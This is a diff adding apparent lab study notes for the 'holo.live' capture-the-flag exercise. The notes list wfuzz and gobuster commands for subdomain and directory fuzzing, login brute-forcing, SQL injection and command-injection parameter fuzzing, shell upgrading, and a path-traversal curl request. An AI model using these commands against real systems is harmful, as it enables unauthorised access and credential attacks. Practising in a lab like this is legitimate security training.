@@ -1,0 +1,64 @@
+searching for subdodmains
+
+wfuzz -u http://holo.live -w subdomains-top1million-110000.txt  -H "Host: FUZZ.holo.live" --hc 404,403,301,302
+is like 
+gobuster vhost -u <URL to fuzz> -w <wordlist>
+
+We recommend using the Seclists "subdomains-top1million-110000.txt" wordlist for fuzzing vhosts.
+===========================================
+
+to search for ls files after knowing current directory from robots.txt 
+wfuzz -u example.com/FUZZ.php -w <wordlist>
+
+    —hc Hide status code
+    —hw Hide word count
+    —hl Hide line count
+    —hh Hide character count
+
+is like 
+gobuster -t <threads> dir -u <URL to fuzz> -w <wordlist>
+We recommend using the Seclists "big.txt" wordlist for directory fuzzing.
+
+-----------------------------------------------------------------------
+
+Cluster Bomb (2 payload sets, 2 positions):
+wfuzz -w usernames.txt -w passwords.txt -d "username=FUZZ&password=FUZ2Z" http://10.10.230.42/support/login
+
+Pitchfork (2 payload sets, 2 positions):
+wfuzz -d 'username=FUZZ&password=FUZ2Z' -H 'Content-Type: application/x-www-form-urlencoded' -z file,usernames.txt -z file,passwords.txt -u http://10.10.230.42/support/login/  --hc 401 -m zip--hh 236
+
+
+
+Battering ram attack(1 payload sets, 2 positions):
+wfuzz -w usernames.txt -w passwords.txt -d "username=FUZZ&password=FUZZ" http://10.10.230.42/support/login 
+
+
+===========================================
+
+SQLI bruteforce:
+wfuzz -u http://example.com/FUZZ.php -w /path/to/sqli-wordlist.txt --hc 200,201,202,203,204,300,301,302,303,304,400,401,402,403,404
+any sqli wordlist
+
+===========================================
+finding vulnerable parameter that you can exploit to gain arbitrary access to the machine.
+Syntax: wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2
+We suggest using the Seclists "big.txt" for fuzzing RCE parameters.
+===========================================
+reverseshell cheatsheet after finding RCE parameter:
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+===========================================
+reate a pseudo-terminal and modifying stty options
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo
+fg
+curl -o dashboard.php "http://dev.holo.live/img.php?file=../admin/dashboard.php"
+
+===========================================
+intial access
+Shodan for remote access
+process injection& tcpview for blue team detection
+phishing
+Defence Evasion Phase
+
